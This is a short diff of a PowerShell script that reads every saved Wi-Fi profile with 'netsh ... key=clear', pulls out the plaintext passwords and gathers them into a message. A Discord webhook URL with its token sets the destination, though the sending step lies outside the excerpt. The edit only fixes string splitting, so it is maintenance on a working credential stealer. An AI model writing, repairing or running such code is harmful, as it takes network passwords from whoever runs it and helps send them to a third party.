@@ -3,10 +3,10 @@ $WebhookUrl = "https://discord.com/api/webhooks/1522586603615162469/cSzV4hP6LxzH
 
 $wifiProfiles = netsh wlan show profiles name=*
 foreach ($profile in $wifiProfiles) {
-    $profileName = $profile.split("":"")[1].trim()
+    $profileName = $profile.Trim().Split(':')[1]
     $profileInfo = netsh wlan show profile name=""$profileName"" key=clear
-    $passwordLine = $profileInfo.split(""`n"") | Where-Object { $_ -match ""Key Content"" }
-    $password = $passwordLine.split("":"")[1].trim()
+    $passwordLine = $profileInfo.Split(""`n"") | Where-Object { $_ -match ""Key Content"" }
+    $password = $passwordLine.Trim().Split(':')[1]
 
     # Add to the message
     if (-not $Message) {
